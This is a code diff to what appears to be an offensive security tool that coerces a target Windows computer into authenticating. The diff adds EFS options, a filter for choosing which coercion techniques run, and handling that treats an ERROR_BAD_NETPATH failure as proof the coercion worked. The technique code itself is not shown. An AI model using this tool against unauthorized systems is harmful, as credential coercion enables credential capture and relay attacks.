@@ -28,6 +28,9 @@ namespace Titanis.CredCoerce
 		[ParameterGroup(ParameterGroupOptions.Required | ParameterGroupOptions.AlwaysInstantiate)]
 		public NetworkParameters NetworkParameters { get; set; }
 
+		[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
+		public EfsCoercionParameters EfsOptions { get; set; }
+
 		[Parameter(0)]
 		[Mandatory]
 		[Description("Name of computer to coerce")]
@@ -50,6 +53,16 @@ namespace Titanis.CredCoerce
 			this.Authentication.Validate(true, context);
 			this.NetworkParameters.ValidateParameters(context);
 		}
+
+		// Selector is '*', an exact tag, or a prefix glob such as 'Efs.*' (case-insensitive)
+		private bool IsSelected(string tag)
+			=> this.Techniques.Any(sel =>
+			{
+				var p = sel.TagSelector;
+				return p == "*"
+					|| string.Equals(p, tag, StringComparison.OrdinalIgnoreCase)
+					|| (p.EndsWith('*') && tag.StartsWith(p[..^1], StringComparison.OrdinalIgnoreCase));
+			});
 
 		static void Main(string[] args)
 			=> RunProgramAsync<Program>(args);
@@ -85,12 +98,21 @@ namespace Titanis.CredCoerce
 			ComponentCatalog.DiscoverComponents(Assembly.GetExecutingAssembly(), MetadataResolver.Default, techs);
 			foreach (var techInfo in techs)
 			{
+				if (!this.IsSelected(techInfo.Tag))
+					continue;
+
 				this.WriteTaskStart($"Attempting technique {techInfo.Tag}");
 				try
 				{
 					var tech = (CoercionTechnique)Activator.CreateInstance(techInfo.ImplementingType, true);
 
 					await tech.Execute(context, cancellationToken);
+					context.Log.MarkTaskComplete();
+				}
+				catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode == 0x35)
+				{
+					// ERROR_BAD_NETPATH: the target tried to reach the victim path, i.e. coercion worked
+					context.Log.WriteVerbose("Got ERROR_BAD_NETPATH; the target attempted to authenticate");
 					context.Log.MarkTaskComplete();
 				}
 				catch (Exception ex)
